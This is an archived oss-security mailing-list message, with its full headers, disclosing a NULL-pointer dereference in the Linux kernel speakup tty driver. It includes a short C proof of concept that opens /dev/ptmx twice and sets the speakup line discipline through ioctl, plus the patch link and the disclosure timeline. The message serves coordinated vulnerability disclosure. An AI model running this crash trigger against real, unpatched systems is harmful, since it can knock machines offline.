X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1991" "Thursday" "19" "November" "2020" "10:46:59" "+0800" "Shisong Qin" "qinshisong1205@gmail.com" "<CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>" "64" "[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close" nil nil nil "11" "2020111902:46:59" "[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close" (number mark "U       qinshisong12 Nov 19   64/1991  " thread-indent "\"[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 10070 invoked by uid 550); 19 Nov 2020 08:42:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13596 invoked from network); 19 Nov 2020 02:47:22 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=5upJFmfA6vrq20dB+3lEa/5R/7fDiulf8ebivRuo4GE=;
        b=GwJyLzNgPACEkLIJlZ/0psqiUbp+++WK/PhOjF0fQmDmb/QkfMkyHrITM5H7QmV0Pa
         wDwZWhaFD1KpRuXNuhpBS38CCUWugkHMnT3O3wcPG3ZR1hyWJr7gy1aJtu6MyAblM9C1
         ZBG6zf4DNQGveAl2ZNydL4fjiWbjZH+covU2PAmvgeNndTq5fIhwXK1Mj2hWAwA9T06w
         DmZtc8jF5PTk7gVZuTb1OsmN4wBayQBkMZMUwv7/GVzymfLMK58XoRTA8W29HdXgfLQc
         4wj0tlwMWlKhiy+tOQUvuGjX9ZWzUMGptDm3fOGd4rjTgF3kFkaIdpNfjEbTrFwIIIW4
         xyHw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=5upJFmfA6vrq20dB+3lEa/5R/7fDiulf8ebivRuo4GE=;
        b=ajyV2EdGse6iorg2UJFSlHyfgOzg08wXIHp9N2QjTceGVTvPDaRvXH6PG4g91ggG8B
         OAMp9fUJE2Ct3gpdDujEUCmrjAtE6G3T6KPL958Qizhg3ZJgWuqGc8JJIZ40Nnq74NBE
         QP+FgCWWmm3cTkc2j8Fe+SoG7S2sH/gN/MbqskRISqV2w0deY0dihZ674EdUj5jP2ahL
         yxktdeWB41ol5XHwsqSrYhrEtqGfigL78lfx8StxBURqBQkPJfSmYLkt1TroRCRmU9SF
         Tr2rlOrhRETzIwlUOsgZK5nmskZNEdn941Khu1m5oMOeoFpr0NaByk1wHTvx9zYP1czw
         RbmA==
X-Gm-Message-State: AOAM531ur5tZipXkYFck5h6Vr8HxhXzzP3AuVzKP51fonmXkKbJ9f7Jy
	Nz1asMovEi/KEkwRcO+g8ZlP98oSffmyO+BJQfv2wtVxaRqMFedq
X-Google-Smtp-Source: ABdhPJy2Ti9Dqi76X+yAttZhuaua6JDRbxDoQUVPFBmGXtsMnNJ3wZ+iZl8PsTNAhcy0KDFf0pWg7EGR2qkM3PBbHds=
X-Received: by 2002:a5d:4612:: with SMTP id t18mr7593841wrq.401.1605754030433;
 Wed, 18 Nov 2020 18:47:10 -0800 (PST)
MIME-Version: 1.0
From: Shisong Qin <qinshisong1205@gmail.com>
Date: Thu, 19 Nov 2020 10:46:59 +0800
Message-ID: <CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: nopitydays@gmail.com
Content-Type: multipart/alternative; boundary="00000000000094aa4c05b46cbed2"
Subject: [oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close

--00000000000094aa4c05b46cbed2
Content-Type: text/plain; charset="UTF-8"

Hi,

Recently we found a NULL-ptr deref BUG in spk_ttyio.c in the longterm 4.19
Linux kernel, and it could also be triggered in the 5.9 Linux kernel. In
function spk_ttyio_ldisc_close, it would free the "speakup_tty->disc_data"
and set "speakup_tty" to NULL. However, if we open two tty device and use
tiocsetd() to set them as "speakup_tty" and close them in turn, the first
close would set "speakup_tty" to NULL, and in the second close would try to
dereference the "speakup_tty", leading to a NULL-ptr deref crash.

This bug could be reproduced in the longterm 4.19 Linux kernel with
CONFIG_STAGING=y, CONFIG_SPEAKUP=y and CONFIG_KASAN=y.
To reproduce it in the 5.9 Linux kernel, CONFIG_ACCESSIBILITY=y is also
required in config, and here is a simple poc:

#define _GNU_SOURCE

#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

int main(void) {
    int disc = 0x1a;
    int fd = open("/dev/ptmx", O_RDWR, 0);
    ioctl(fd, 0x5423, &disc);
    int fd2 = open("/dev/ptmx", O_RDWR, 0);
    ioctl(fd2, 0x5423, &disc);
    return 0;
}

After the process return, it seems the automated calling to release would
trigger the NULL-ptr deref bug.

Here is the commit to patch this BUG:
https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/tty.git/commit/?h=tty-linus&id=d4122754442799187d5d537a9c039a49a67e57f1

Timeline:
* 2020/11/10 - Vulnerability reported to security@kernel.org
* 2020/11/11 - Vulnerability confirmed, and reported to
linux-distros@vs.openwall.org.
* 2020/11/19 - Vulnerability opened.

Thanks,
Shisong Qin and Bodong Zhao, Tsinghua University

--00000000000094aa4c05b46cbed2--
